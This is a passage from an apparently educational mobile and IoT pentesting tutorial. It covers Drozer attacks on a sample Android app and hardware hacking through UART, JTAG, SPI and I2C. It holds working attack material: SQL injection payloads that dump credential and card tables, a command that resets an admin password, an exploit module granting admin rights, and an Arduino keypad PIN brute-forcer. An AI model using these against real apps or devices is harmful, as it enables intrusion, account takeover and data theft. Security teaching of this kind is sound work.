# Find exported services:
dz> run app.service.info -a com.example.vulnerableapp

# Output:
# Package: com.example.vulnerableapp
#   com.example.vulnerableapp.AdminService
#     Permission: null
#     Exported: True                      ← ANY APP CAN START THIS!

# Find broadcast receivers:
dz> run app.broadcast.info -a com.example.vulnerableapp

# Output:
# Package: com.example.vulnerableapp
#   com.example.vulnerableapp.SMSReceiver
#     Permission: null
#     Exported: True

# Send a broadcast to trigger it:
dz> run app.broadcast.send --action android.provider.Telephony.SMS_RECEIVED

# Find content providers (database interfaces):
dz> run app.provider.info -a com.example.vulnerableapp

# Output:
# Package: com.example.vulnerableapp
#   com.example.vulnerableapp.UserProvider
#     Authority: com.example.vulnerableapp.users
#     Read Permission: null               ← NO READ PERMISSION!
#     Write Permission: null              ← NO WRITE PERMISSION!
#     Exported: True                      ← ANYONE CAN ACCESS DATABASE!
#     Grant URI Permissions: False</div>

            <h4>Exploiting Content Providers (SQL Injection)</h4>

            <div class="code"># Content providers expose database queries to other apps
# If not properly secured, they're vulnerable to SQL injection!

# List accessible content URIs:
dz> run scanner.provider.finduris -a com.example.vulnerableapp

# Output:
# Scanning com.example.vulnerableapp...
# content://com.example.vulnerableapp.users/
# content://com.example.vulnerableapp.users/user
# content://com.example.vulnerableapp.users/admin

# Query the content provider:
dz> run app.provider.query content://com.example.vulnerableapp.users/user

# Output:
# | _id | username      | password       | email                |
# |-----|---------------|----------------|----------------------|
# | 1   | john_doe      | password123    | john@example.com     |
# | 2   | admin         | admin123       | admin@example.com    |
# | 3   | alice         | mypassword     | alice@example.com    |

# SQL Injection test - try to dump all data:
dz> run app.provider.query content://com.example.vulnerableapp.users/user --selection "1=1"

# If vulnerable, returns all records regardless of intended filter

# Advanced SQL injection - extract database schema:
dz> run app.provider.query content://com.example.vulnerableapp.users/user --projection "* FROM sqlite_master WHERE type='table'--"

# Try to read other tables:
dz> run app.provider.query content://com.example.vulnerableapp.users/user --projection "* FROM credit_cards--"

# Output:
# | _id | card_number       | cvv  | expiry   |
# |-----|-------------------|------|----------|
# | 1   | 4532123456789012  | 123  | 12/25    |
# | 2   | 5425233412341234  | 456  | 06/26    |

# DATA BREACH! Credit cards exposed via SQL injection!

# Try to modify data (if provider allows write):
dz> run app.provider.update content://com.example.vulnerableapp.users/user --selection "_id=2" --string username admin --string password hacked123

# Changed admin password!</div>

            <h4>Automated Vulnerability Scanning</h4>

            <div class="code"># Drozer has built-in scanners for common vulnerabilities:

# Scan for all vulnerabilities in a package:
dz> run scanner.misc.traverse -a com.example.vulnerableapp

# Scans for path traversal vulnerabilities

# Scan for native code issues:
dz> run scanner.misc.native -a com.example.vulnerableapp

# Scan for debug flags:
dz> run app.package.debuggable

# Output:
# Package: com.example.vulnerableapp
#   Debuggable: True                      ← SECURITY ISSUE!

# Scan for backup flags:
dz> run app.package.backup

# Output:
# Package: com.example.vulnerableapp
#   Allows Backup: True                   ← Data can be extracted via adb backup!

# Scan for shared UID:
dz> run app.package.shareduid

# Scan for SQL injection in all providers:
dz> run scanner.provider.injection -a com.example.vulnerableapp

# Output:
# Scanning com.example.vulnerableapp...
# Injection in Projection:
#   content://com.example.vulnerableapp.users/user
#     Vulnerable to projection-based SQL injection
# 
# Injection in Selection:
#   content://com.example.vulnerableapp.users/user
#     Vulnerable to selection-based SQL injection

# Scan for path traversal in providers:
dz> run scanner.provider.traversal -a com.example.vulnerableapp

# Scan for all exported components:
dz> run scanner.activity.browsable -a com.example.vulnerableapp
dz> run scanner.provider.finduris -a com.example.vulnerableapp</div>

            <h4>Creating a Proof-of-Concept Exploit</h4>

            <div class="code"># Scenario: We found that com.example.vulnerableapp has:
# 1. Exported activity that grants admin privileges
# 2. No permission required
# 
# Let's write a malicious APK to exploit it!

# Create exploit.py (Drozer module):

class Exploit(Module):
    name = "Exploit Vulnerable App"
    description = "Grant admin privileges via exported activity"
    
    def execute(self, arguments):
        # Launch the privileged activity
        intent = android.Intent()
        intent.setComponent(
            "com.example.vulnerableapp",
            "com.example.vulnerableapp.GrantAdminActivity"
        )
        intent.putExtra("username", "attacker")
        intent.putExtra("grant_admin", True)
        
        self.getContext().startActivity(intent)
        self.stdout.write("[+] Admin privileges granted to 'attacker'!\n")

# Save as ~/.drozer/modules/exploit.py

# Run the exploit:
dz> run exploit

# Output:
# [+] Admin privileges granted to 'attacker'!
# 
# Exploitation successful! The attacker now has admin access.</div>

            <div class="info-box">
                <h4>Common Drozer Findings</h4>
                <p><strong>Exported Components Without Permissions:</strong><br>
                • Activities that can be launched by malicious apps<br>
                • Services that can be started/bound without authorization<br>
                • Broadcast receivers that process untrusted intents<br>
                • Content providers that expose sensitive data<br><br>
                <strong>SQL Injection in Content Providers:</strong><br>
                • Projection-based injection (manipulate SELECT columns)<br>
                • Selection-based injection (manipulate WHERE clause)<br>
                • Allows reading arbitrary tables, modifying data<br><br>
                <strong>Path Traversal:</strong><br>
                • Content providers that accept file paths as input<br>
                • Can read files outside app's directory (../../../etc/passwd)<br><br>
                <strong>Debug/Backup Flags:</strong><br>
                • android:debuggable="true" in production<br>
                • android:allowBackup="true" (data can be extracted)<br><br>
                <strong>Remediation:</strong><br>
                • Set android:exported="false" unless component MUST be accessible<br>
                • Require custom permissions for sensitive components<br>
                • Use parameterized queries (never string concatenation)<br>
                • Validate all input (paths, intents, query parameters)<br>
                • Disable debugging and backups in production builds</p>
            </div>

            <div class="warning-box">
                <h4>⚠️ iOS Pentesting: A Quick Overview</h4>
                <p>While this chapter focuses on Android, iOS pentesting has similar concepts but different tools:<br><br>
                <strong>iOS App Structure:</strong><br>
                • <strong>IPA:</strong> iOS App Store Package (like APK for Android)<br>
                • <strong>Mach-O:</strong> iOS executable format (like DEX for Android)<br>
                • <strong>Plist:</strong> Property list files (like AndroidManifest.xml)<br><br>
                <strong>Key Tools:</strong><br>
                • <strong>class-dump:</strong> Extract Objective-C headers from apps<br>
                • <strong>Clutch:</strong> Decrypt App Store encrypted apps (requires jailbreak)<br>
                • <strong>Hopper/Ghidra:</strong> Disassemble Mach-O binaries<br>
                • <strong>Frida:</strong> Works on iOS too! (requires jailbreak)<br>
                • <strong>Cycript:</strong> JavaScript/Objective-C hybrid console for runtime manipulation<br>
                • <strong>Burp Suite:</strong> Same HTTPS interception as Android<br><br>
                <strong>Key Differences:</strong><br>
                • iOS apps are always encrypted by Apple (need jailbreak to decrypt)<br>
                • No easy "decompile to source" (Objective-C/Swift → assembly only)<br>
                • Sandbox is much stricter (harder to access other apps' data)<br>
                • Jailbreaking required for most pentesting tools<br><br>
                <strong>iOS Testing Workflow:</strong><br>
                1. <strong>Jailbreak device:</strong> Use checkra1n, unc0ver, or Odyssey<br>
                2. <strong>Install Frida:</strong> Same process as Android<br>
                3. <strong>Decrypt IPA:</strong> Use Clutch or CrackerXI+<br>
                4. <strong>Static analysis:</strong> class-dump for headers, Hopper for disassembly<br>
                5. <strong>Dynamic analysis:</strong> Frida hooks, Cycript runtime manipulation<br>
                6. <strong>Traffic interception:</strong> Burp Suite + certificate pinning bypass<br><br>
                iOS pentesting is generally harder than Android due to Apple's restrictions, but the core vulnerabilities (hardcoded secrets, insecure crypto, logic flaws) are the same!</p>
            </div>

            <div class="metaphor-box">
                <h4>🎉 You're Now a Mobile Security Expert!</h4>
                <p>You've mastered the complete mobile pentesting toolkit:<br><br>
                ✅ <strong>APKTool:</strong> Decompile, modify, recompile APKs<br>
                ✅ <strong>Jadx:</strong> Decompile to readable Java code<br>
                ✅ <strong>ADB:</strong> Complete control over Android devices<br>
                ✅ <strong>MobSF:</strong> Automated security assessment<br>
                ✅ <strong>Frida:</strong> Runtime manipulation and bypass techniques<br>
                ✅ <strong>Drozer:</strong> Android-specific vulnerability discovery<br><br>
                <strong>Your Mobile Pentesting Workflow:</strong><br>
                1. <strong>Acquisition:</strong> Download APK (from device, store, or APK mirror)<br>
                2. <strong>Static Analysis:</strong> Jadx (read code) + MobSF (auto-scan) + grep (search secrets)<br>
                3. <strong>Dynamic Analysis:</strong> ADB (logs, data) + Frida (hooks) + Burp Suite (traffic)<br>
                4. <strong>Exploitation:</strong> APKTool (modify & recompile) + Drozer (component attacks)<br>
                5. <strong>Reporting:</strong> Document findings with severity, impact, PoC, remediation<br><br>
                <strong>Practice Resources:</strong><br>
                • <strong>InsecureBankv2:</strong> Intentionally vulnerable banking app<br>
                • <strong>DVIA:</strong> Damn Vulnerable iOS App<br>
                • <strong>OWASP MSTG:</strong> Mobile Security Testing Guide<br>
                • <strong>HackerOne/Bugcrowd:</strong> Real bug bounties for mobile apps<br><br>
                Mobile security is one of the fastest-growing fields in cybersecurity. With 5+ billion smartphones and countless apps, vulnerabilities are everywhere. Now go find them! 🚀📱</p>
            </div>
        </section>

        <!-- SECTION 3: IoT & Hardware Hacking -->
        <section id="iot-hardware" class="section">
            <h2 class="section-title">IoT & Hardware Hacking</h2>
            <p class="section-intro">Welcome to the physical layer of hacking—where software meets hardware, where invisible radio waves carry secrets, and where a $5 chip can break a $5,000 smart lock. IoT (Internet of Things) devices are EVERYWHERE: smart thermostats, security cameras, baby monitors, door locks, medical devices, industrial controllers. They're connected to the internet, often poorly secured, and contain vulnerabilities that traditional pentesting misses. In this section, you'll learn to speak the language of hardware: UART, JTAG, SPI, I2C. You'll extract firmware from chips, reverse engineer protocols, and exploit devices that don't even have keyboards. This is where hackers become hardware ninjas!</p>

            <div class="metaphor-box">
                <h4>💡 IoT Hacking = Being a Doctor for Electronics</h4>
                <p>Imagine a smart lock is a patient. As a doctor, you need to:<br><br>
                <strong>• Examine externally:</strong> Look at the device, find ports, identify chips<br>
                <strong>• Take X-rays:</strong> Open the device, analyze the circuit board<br>
                <strong>• Read its DNA:</strong> Extract firmware from memory chips<br>
                <strong>• Listen to its heartbeat:</strong> Monitor serial communication (UART/SPI/I2C)<br>
                <strong>• Perform surgery:</strong> Solder wires, connect debugging interfaces<br>
                <strong>• Test reflexes:</strong> Send commands, observe responses<br><br>
                Hardware hacking requires patience, careful observation, and understanding how electronics communicate. But the rewards are huge—you can bypass security that software-only hackers can't touch!</p>
            </div>

            <h3>Understanding Hardware Communication Protocols</h3>

            <p>Before you can hack IoT devices, you need to understand how their internal components communicate. Here are the four most common hardware protocols:</p>

            <h4>UART - Universal Asynchronous Receiver/Transmitter</h4>

            <div class="info-box">
                <h4>What is UART?</h4>
                <p><strong>UART</strong> is the most common serial communication protocol. It's how embedded devices talk to computers and each other.<br><br>
                <strong>Key characteristics:</strong><br>
                • <strong>Asynchronous:</strong> No shared clock signal (devices agree on speed beforehand)<br>
                • <strong>Two wires:</strong> TX (transmit) and RX (receive) + GND (ground)<br>
                • <strong>Common speeds:</strong> 9600, 19200, 38400, 57600, 115200 baud (bits per second)<br>
                • <strong>Use case:</strong> Debug consoles, bootloader access, shell access<br><br>
                <strong>Why hackers love UART:</strong><br>
                Many IoT devices have UART ports that give you a root shell! Manufacturers use them for debugging during development, then forget to disable them in production. Finding UART = instant access!</p>
            </div>

            <div class="code"># UART has 3 main pins (sometimes 4):
# 
# TX  (Transmit)  → Device sends data OUT
# RX  (Receive)   → Device receives data IN
# GND (Ground)    → Common ground reference
# VCC (Power)     → Sometimes present (usually 3.3V or 5V)
#
# IMPORTANT: Connect TX of device to RX of your adapter!
#           Connect RX of device to TX of your adapter!
#           ALWAYS connect GND to GND!
#
# Visual diagram:
# 
# Your USB-to-UART adapter:       Target Device:
# ┌────────────────┐              ┌──────────────┐
# │ TX ────────────┼──────────────┼───→ RX       │
# │ RX ←───────────┼──────────────┼──── TX       │
# │ GND ───────────┼──────────────┼──── GND      │
# └────────────────┘              └──────────────┘

# Common UART devices you'll use:
# • FTDI FT232 (USB to UART, ~$15)
# • CP2102 module (~$5)
# • PL2303 (~$3)
# • Bus Pirate (multi-protocol, ~$35)</div>

            <h4>Finding UART on a Circuit Board</h4>

            <div class="code"># Step 1: Open the device (unscrew, pry carefully)

# Step 2: Look for suspicious pin headers
# UART pins often appear as:
# • 4 holes in a row (labeled or unlabeled)
# • 4 solder pads
# • Test points labeled J1, J2, JP1, etc.
# • Sometimes labeled: TX, RX, GND, VCC or UART, Serial, Console

# Step 3: Use a multimeter to identify pins

# Finding GND (Ground):
# Set multimeter to continuity mode (beep symbol)
# Touch black probe to a known ground (USB shield, screw holes, large metal areas)
# Touch red probe to each pin
# The pin that beeps = GND

# Finding VCC (Power):
# Set multimeter to voltage mode (DC V)
# Black probe on GND
# Red probe on each remaining pin
# Pin showing 3.3V or 5.0V = VCC
# (Device must be powered on!)

# Finding TX (Transmit):
# Set multimeter to voltage mode
# Black probe on GND
# Red probe on remaining pins
# Pin that shows fluctuating voltage when device boots = TX
# (TX is constantly sending data during boot)

# Finding RX (Receive):
# Process of elimination: the last pin is RX
# Or: RX usually stays at VCC level (3.3V or 5V) when idle

# Pro tip: If you have an oscilloscope or logic analyzer, 
# connect to suspected TX pin and power on device.
# You'll see data bursts during boot = confirmed TX!</div>

            <h4>Connecting to UART</h4>

            <div class="code"># Using a USB-to-UART adapter (e.g., FTDI FT232):

# 1. Physical connections:
# Device GND  → Adapter GND
# Device TX   → Adapter RX
# Device RX   → Adapter TX
# (Do NOT connect VCC if device has its own power!)

# 2. Plug adapter into your Kali machine

# 3. Find the serial device:
ls /dev/ttyUSB*

# Output:
# /dev/ttyUSB0

# Or:
dmesg | grep tty

# Output:
# [12345.678] usb 1-1: FTDI USB Serial Device converter now attached to ttyUSB0

# 4. Determine baud rate (speed)
# Common baud rates: 9600, 19200, 38400, 57600, 115200
# Try each until you see readable text!

# 5. Connect with screen:
screen /dev/ttyUSB0 115200

# Format: screen <device> <baud_rate>
# 
# If you see garbage text, wrong baud rate! Try another.
# If you see nothing, try pressing Enter or rebooting the device.
# If you see clean boot messages = SUCCESS!

# Alternative tools:

# minicom:
minicom -D /dev/ttyUSB0 -b 115200

# picocom:
picocom -b 115200 /dev/ttyUSB0

# cu:
cu -l /dev/ttyUSB0 -s 115200

# 6. Common UART outputs you'll see:

# Example 1: Bootloader (U-Boot):
# U-Boot 2020.04 (Jan 15 2024 - 12:34:56 +0000)
# CPU: ARM Cortex-A7
# DRAM: 512 MiB
# Hit any key to stop autoboot: 3... 2... 1...
# 
# ← PRESS ENTER HERE TO INTERRUPT BOOT!
# 
# => 
# ← You now have bootloader shell!

# Example 2: Linux boot log:
# [    0.000000] Booting Linux on physical CPU 0x0
# [    0.000000] Linux version 4.19.0 (root@buildserver)
# [    1.234567] Freeing unused kernel memory: 1024K
# [    2.345678] systemd[1]: Starting system...
# 
# SmartDevice login: _
# ← You get a login prompt!

# Example 3: Root shell (jackpot!):
# 
# BusyBox v1.31.1 () built-in shell (ash)
# Enter 'help' for a list of built-in commands.
# 
# / # _
# ← Root shell without password!</div>

            <div class="warning-box">
                <h4>⚠️ UART Voltage Levels - Don't Fry Your Device!</h4>
                <p><strong>CRITICAL:</strong> IoT devices typically use 3.3V logic. Some USB-to-UART adapters use 5V. Connecting 5V to a 3.3V device = DEAD DEVICE!<br><br>
                <strong>Always check:</strong><br>
                1. Measure VCC pin with multimeter<br>
                2. Configure your adapter for correct voltage (most FTDI adapters have a jumper)<br>
                3. Use a logic level shifter if mixing voltages<br><br>
                <strong>Safe rule:</strong> If VCC reads ~3.3V, your adapter MUST be in 3.3V mode!<br>
                <strong>Modern adapters:</strong> Many auto-detect voltage levels, but ALWAYS verify!</p>
            </div>

            <h4>JTAG - Joint Test Action Group</h4>

            <div class="info-box">
                <h4>What is JTAG?</h4>
                <p><strong>JTAG</strong> is a debugging interface that gives you COMPLETE control over a processor. Originally designed for testing circuit boards, it's now used for programming chips and debugging firmware.<br><br>
                <strong>Key capabilities:</strong><br>
                • <strong>Read/write memory:</strong> Dump firmware directly from chip<br>
                • <strong>Step through code:</strong> Debug firmware line by line<br>
                • <strong>Set breakpoints:</strong> Pause execution at specific addresses<br>
                • <strong>Flash firmware:</strong> Write modified firmware to device<br><br>
                <strong>Why hackers love JTAG:</strong><br>
                JTAG bypasses all software security. Password protection? Irrelevant. Encryption? Can dump keys from memory. Locked bootloader? Can read firmware anyway.<br><br>
                <strong>Downside:</strong> Requires physical access, soldering skills, and expensive tools (but worth it!)</p>
            </div>

            <div class="code"># JTAG has 4-5 main pins:
# 
# TDI  (Test Data In)       → Data going TO the chip
# TDO  (Test Data Out)      → Data coming FROM the chip
# TCK  (Test Clock)         → Clock signal
# TMS  (Test Mode Select)   → Control signal
# TRST (Test Reset)         → Reset signal (optional)
# GND  (Ground)             → Common ground
# VCC  (Target Voltage)     → Reference voltage (don't connect power!)

# Common JTAG adapters:
# • Bus Pirate (~$35, beginner-friendly)
# • SEGGER J-Link (~$60 for EDU version)
# • FTDI-based JTAG adapters (~$20)
# • Black Magic Probe (~$70, pro-level)

# Finding JTAG pins:
# Look for:
# • 10-pin, 14-pin, or 20-pin headers (standard JTAG connectors)
# • Labeled pads: JTAG, TCK, TMS, TDI, TDO
# • ARM processors often have 10-pin or 20-pin JTAG

# Identifying JTAG pins with multimeter:
# 1. Find GND (continuity test to metal chassis)
# 2. Find VCC (measures 3.3V or 1.8V when powered)
# 3. Remaining pins require logic analyzer or trial-and-error

# Or use JTAGulator (~$150):
# Automated tool that finds JTAG pins by testing all combinations!</div>

            <h4>Using OpenOCD with JTAG</h4>

            <div class="code"># OpenOCD (Open On-Chip Debugger) is THE tool for JTAG

# Install on Kali:
sudo apt install openocd

# Example: Connect to ARM Cortex-M3 chip using FTDI adapter

# Step 1: Create config file (openocd.cfg):
interface ftdi
ftdi_vid_pid 0x0403 0x6014
ftdi_layout_init 0x0008 0x000b

transport select jtag

source [find target/stm32f1x.cfg]

# Step 2: Run OpenOCD:
openocd -f openocd.cfg

# Output:
# Open On-Chip Debugger 0.11.0
# Info : FTDI FT232H found
# Info : clock speed 1000 kHz
# Info : JTAG tap: stm32f1x.cpu tap/device found: 0x3ba00477
# Info : stm32f1x.cpu: hardware has 6 breakpoints, 4 watchpoints
# Info : starting gdb server for stm32f1x.cpu on 3333
# Info : Listening on port 3333 for gdb connections

# Step 3: Connect with GDB (in another terminal):
arm-none-eabi-gdb

# Inside GDB:
(gdb) target remote localhost:3333
(gdb) monitor reset halt
(gdb) monitor flash write_image erase firmware.bin 0x08000000
(gdb) monitor reset

# You just flashed custom firmware via JTAG!

# Step 4: Dump firmware from chip:
# In OpenOCD telnet session:
telnet localhost 4444

# Inside OpenOCD telnet:
> halt
> dump_image firmware_dump.bin 0x08000000 0x20000

# Dumps 128KB of firmware from address 0x08000000!

# Common OpenOCD commands:
# halt                        → Stop CPU
# reset                       → Reset CPU
# reset halt                  → Reset and stop
# mdw <address>               → Read 32-bit word from memory
# mww <address> <value>       → Write 32-bit word to memory
# dump_image <file> <addr> <size> → Dump memory region
# load_image <file> <addr>    → Load file into memory
# reg                         → Show all registers
# step                        → Execute one instruction</div>

            <h4>SPI - Serial Peripheral Interface</h4>

            <div class="info-box">
                <h4>What is SPI?</h4>
                <p><strong>SPI</strong> is a synchronous serial protocol used for communicating with flash memory chips, sensors, and displays.<br><br>
                <strong>Key characteristics:</strong><br>
                • <strong>4 wires:</strong> MOSI, MISO, SCK, CS<br>
                • <strong>Synchronous:</strong> Has dedicated clock line<br>
                • <strong>Fast:</strong> Much faster than UART or I2C<br>
                • <strong>Common use:</strong> Flash memory chips (EEPROM, NOR flash)<br><br>
                <strong>Why hackers love SPI:</strong><br>
                Many IoT devices store firmware on external SPI flash chips. You can desolder the chip, read it with a $10 programmer, extract firmware, modify it, and flash it back. Complete firmware control without JTAG!</p>
            </div>

            <div class="code"># SPI has 4 main pins:
# 
# MOSI (Master Out, Slave In)  → Data from your tool to chip
# MISO (Master In, Slave Out)  → Data from chip to your tool
# SCK  (Serial Clock)          → Clock signal
# CS   (Chip Select)           → Enable this specific chip (active low)
# GND  (Ground)                → Common ground

# Common SPI flash chips:
# • 25LC series (Microchip)
# • AT25 series (Atmel)
# • MX25L series (Macronix)
# • W25Q series (Winbond) ← Very common!

# Identifying SPI flash chips:
# Look for 8-pin SOIC or WSON packages
# Chip markings: W25Q128FV, MX25L3206E, etc.
# First digits indicate family, last digits indicate size:
#   W25Q64  = 64 Mbit (8 MB)
#   W25Q128 = 128 Mbit (16 MB)

# Reading SPI flash with CH341A programmer (~$5 on AliExpress):

# Step 1: Identify chip pinout (look up datasheet)
# Standard SOIC8 pinout:
#     ┌─────┐
# CS  │1  8│ VCC
# DO  │2  7│ HOLD
# WP  │3  6│ CLK
# GND │4  5│ DI
#     └─────┘

# Step 2: Place chip in programmer socket (or use test clip)

# Step 3: Connect programmer to USB

# Step 4: Use flashrom to read:
flashrom -p ch341a_spi -r firmware_dump.bin

# Output:
# flashrom v1.2
# Calibrating delay loop... OK.
# Found Winbond flash chip "W25Q128.V" (16384 kB, SPI) on ch341a_spi.
# Reading flash... done.

# Step 5: Analyze firmware:
binwalk firmware_dump.bin
strings firmware_dump.bin | grep -i password

# Step 6: Modify firmware (e.g., remove password check)
# [Use hex editor or recompile]

# Step 7: Write modified firmware back:
flashrom -p ch341a_spi -w modified_firmware.bin

# Step 8: Resolder chip to board (or reconnect)

# Device now runs your modified firmware!</div>

            <h4>I2C - Inter-Integrated Circuit</h4>

            <div class="info-box">
                <h4>What is I2C?</h4>
                <p><strong>I2C</strong> (pronounced "I-squared-C") is a two-wire communication protocol for connecting sensors, EEPROMs, and peripherals.<br><br>
                <strong>Key characteristics:</strong><br>
                • <strong>2 wires:</strong> SDA (data) and SCL (clock)<br>
                • <strong>Multi-master:</strong> Multiple devices on same bus<br>
                • <strong>Addressing:</strong> Each device has unique 7-bit address<br>
                • <strong>Slower:</strong> Typically 100-400 kHz<br><br>
                <strong>Why hackers love I2C:</strong><br>
                I2C is used for configuration EEPROMs that store device settings, MAC addresses, encryption keys. You can read/write these without removing chips!</p>
            </div>

            <div class="code"># I2C has 2 main pins (+ power):
# 
# SDA (Serial Data)    → Bidirectional data line
# SCL (Serial Clock)   → Clock signal
# GND (Ground)         → Common ground
# VCC (Power)          → Pull-up voltage (3.3V or 5V)

# Common I2C devices:
# • AT24C series EEPROMs (configuration storage)
# • DS1307 RTC (real-time clock)
# • BME280 (temperature/humidity sensor)
# • OLED displays

# Using Bus Pirate to scan I2C bus:

# Connect Bus Pirate:
screen /dev/ttyUSB0 115200

# Enter I2C mode:
HiZ> m
# Select: 4 (I2C)
I2C> W
# Power: ON
I2C> P
# Pull-ups: ON

# Scan for I2C devices:
I2C> (1)
# Macro 1 = I2C bus scanner

# Output:
# Searching I2C address space. Found devices at:
# 0x50 (0xA0 W) (0xA1 R)  ← EEPROM detected!
# 0x68 (0xD0 W) (0xD1 R)  ← RTC detected!

# Read from EEPROM at address 0x50:
I2C> [0xA0 0x00 0x00 [0xA1 r:16]

# Format breakdown:
# [ = Start condition
# 0xA0 = Device address (write mode)
# 0x00 0x00 = Memory address to read from
# [ = Repeated start
# 0xA1 = Device address (read mode)
# r:16 = Read 16 bytes
# ] = Stop condition

# Output (hex dump of EEPROM):
# 0x48 0x65 0x6C 0x6C 0x6F 0x20 0x57 0x6F ...
# (ASCII: "Hello World...")

# Write to EEPROM:
I2C> [0xA0 0x00 0x00 0x41 0x42 0x43]
# Writes "ABC" to address 0x0000</div>

            <h3>Bus Pirate - The Universal Hardware Hacking Tool</h3>

            <p><strong>Bus Pirate</strong> is a multi-protocol hardware debugging tool that speaks UART, SPI, I2C, JTAG, 1-Wire, and more. It's like a Swiss Army knife for hardware hacking!</p>

            <div class="code"># Bus Pirate v3.6 (~$35, v4 ~$50)
# Buy from: Seeed Studio, Adafruit, SparkFun

# Connect to Bus Pirate:
screen /dev/ttyUSB0 115200

# Output:
# HiZ>

# Get help:
HiZ> ?

# Main modes:
# 1. UART
# 2. I2C
# 3. SPI
# 4. JTAG
# 5. 1-Wire
# 6. Raw wire (bitbang mode)

# Example: Dump SPI flash with Bus Pirate

# Enter SPI mode:
HiZ> m
# Select: 5 (SPI)
SPI> 3
# Select speed: 3 (1 MHz)
SPI> W
# Power: ON

# Read JEDEC ID from flash chip:
SPI> [0x9F r:3]

# Output:
# 0xEF 0x40 0x18
# ← Winbond W25Q128 detected!

# Dump first page (256 bytes):
SPI> [0x03 0x00 0x00 0x00 r:256]
# Command 0x03 = Read data
# Address: 0x000000
# Read: 256 bytes

# Bus Pirate pin assignments:
# Pin 1: GND
# Pin 2: +3.3V (output)
# Pin 3: +5V (output)
# Pin 4: ADC (voltage measurement)
# Pin 5-10: Protocol-specific (changes per mode)

# UART mode (pins 5-10):
# Pin 7: TX  (transmit)
# Pin 8: RX  (receive)

# SPI mode (pins 5-10):
# Pin 5: CS  (chip select)
# Pin 6: MISO (data in)
# Pin 7: CLK (clock)
# Pin 8: MOSI (data out)

# I2C mode (pins 5-10):
# Pin 7: SDA (data)
# Pin 8: SCL (clock)

# Measure voltage on a pin:
HiZ> v
# Shows voltage on ADC pin (Pin 4)</div>

            <h3>Arduino & Raspberry Pi as Hacking Tools</h3>

            <h4>Arduino for Hardware Attacks</h4>

            <div class="code"># Arduino can be used for:
# • Brute-forcing PIN codes
# • Replay attacks (capturing and replaying RF signals)
# • BadUSB attacks (act as malicious keyboard/mouse)
# • Protocol fuzzing
# • Custom hardware implants

# Example: Arduino-based PIN brute-forcer for keypads

# Hardware needed:
# • Arduino Uno ($25)
# • Relay module ($5)
# • Jumper wires

# Arduino sketch (PIN_Bruteforce.ino):

void setup() {
  // Set pins 2-5 as outputs (connected to keypad buttons)
  pinMode(2, OUTPUT);  // Button 1
  pinMode(3, OUTPUT);  // Button 2
  pinMode(4, OUTPUT);  // Button 3
  pinMode(5, OUTPUT);  // Button 4
  
  Serial.begin(9600);
}

void pressButton(int button, int duration) {
  digitalWrite(button, HIGH);  // Press button
  delay(duration);
  digitalWrite(button, LOW);   // Release button
  delay(200);
}

void enterPIN(int pin) {
  String pinStr = String(pin);
  
  for (int i = 0; i < pinStr.length(); i++) {
    int digit = pinStr.charAt(i) - '0';
    pressButton(digit + 2, 100);  // Press corresponding button
    delay(200);
  }
  
  pressButton(6, 100);  // Press ENTER button
  delay(2000);  // Wait for response
}

void loop() {
  Serial.println("Starting PIN brute-force: 0000-9999");
  
  for (int pin = 0; pin <= 9999; pin++) {
    Serial.print("Trying: ");
    Serial.println(pin);
    
    enterPIN(pin);
    
    // Check if access granted (monitor LED or use light sensor)
    // If successful, stop and alert
    
    delay(500);  // Prevent rate limiting
  }
}

# This will try all 10,000 PINs automatically!
# At 3 seconds per attempt = ~8 hours for full range</code></div>

            <h4>Raspberry Pi for Advanced Attacks</h4>

            <div class="code"># Raspberry Pi can run full Kali Linux!
# Perfect for:
# • Portable pentesting platform
# • Wireless attacks (with USB WiFi adapter)
# • Network implants (drop box)
# • Automated exploitation
# • Man-in-the-middle attacks

# Install Kali on Raspberry Pi:
# Download: https://www.kali.org/get-kali/#kali-arm
# Flash to SD card:
dd if=kali-linux-2024.1-raspberry-pi-arm64.img of=/dev/sdX bs=4M status=progress

# Default credentials:
# Username: kali
# Password: kali

# Use cases:

# 1. WiFi Pineapple alternative:
# Set up rogue access point with hostapd
# Capture credentials with Responder

# 2. Network implant:
# Hide Raspberry Pi in target network
# VPN back to your C2 server
# Pivot into internal network

# 3. Physical pentesting tool:
# Battery pack + Pi + USB ethernet adapter
# Plug into network jack
# Automatic nmap scan and exploitation

# 4. RFID/NFC cloning:
# Connect PN532 NFC module
# Clone access badges

# 5. SDR (Software Defined Radio):
# Connect RTL-SDR dongle
# Capture 433 MHz signals (garage doors, car keys)
# Analyze and replay</div>

            <h3>Firmware Extraction & Analysis</h3>

            <h4>Method 1: Dumping Firmware via UART/JTAG</h4>

            <div class="code"># If you have bootloader access via UART:

# U-Boot example:
=> md 0x80000000 0x100000
# Reads 1MB from address 0x80000000
# Copy output (hex dump) to file

# Or use loadb/loady to transfer via YMODEM:
=> loady 0x80000000
# In your terminal: Ctrl+A, then :exec !! sz firmware.bin

# If you have JTAG access:
# Use OpenOCD (shown earlier):
telnet localhost 4444
> dump_image firmware.bin 0x00000000 0x200000
# Dumps 2MB from start of flash</div>

            <h4>Method 2: Reading Flash Chip Directly</h4>

            <div class="code"># Desolder flash chip or use test clip

# Using flashrom with CH341A programmer:
flashrom -p ch341a_spi -r firmware.bin

# Using Bus Pirate:
# (More complex, requires Python script)
python flashrom.py --read firmware.bin

# Using logic analyzer + sigrok:
# Capture SPI traffic during boot
# Reconstruct firmware from captured data</div>

            <h4>Method 3: Extracting from Update Files</h4>

            <div class="code"># Many manufacturers provide firmware updates
# Download from their website
# Extract with binwalk:

binwalk -e firmware_update.bin

# Output:
# DECIMAL       HEXADECIMAL     DESCRIPTION
# --------------------------------------------------------------------------------
# 0             0x0             uImage header
# 64            0x40            LZMA compressed data
# 1048576       0x100000        Squashfs filesystem, little endian
# 3145728       0x300000        JFFS2 filesystem data

cd _firmware_update.bin.extracted/
ls

# You now have the filesystem!
# Look for:
# - /etc/passwd (user accounts)
# - /etc/shadow (password hashes)
# - /etc/config/ (device configuration)
# - Hardcoded credentials
# - Private keys
# - API tokens</div>

            <h4>Analyzing Firmware with Binwalk</h4>

            <div class="code"># Binwalk is THE tool for firmware analysis

# Basic scan:
binwalk firmware.bin

# Extract all embedded files:
binwalk -e firmware.bin

# Extract AND run entropy analysis:
binwalk -E firmware.bin

# High entropy = encrypted/compressed data
# Low entropy = plaintext/code

# Signature scan:
binwalk -B firmware.bin

# Looks for known file signatures

# Disassemble code:
binwalk -D 'arm:bootloader' firmware.bin

# Custom extraction:
binwalk --dd='.*' firmware.bin

# After extraction, explore the filesystem:
cd _firmware.bin.extracted/squashfs-root/
find . -name "*.conf" -o -name "*.cfg" | xargs grep -i "password"

# Common findings:
# - WiFi passwords in /etc/wireless/config
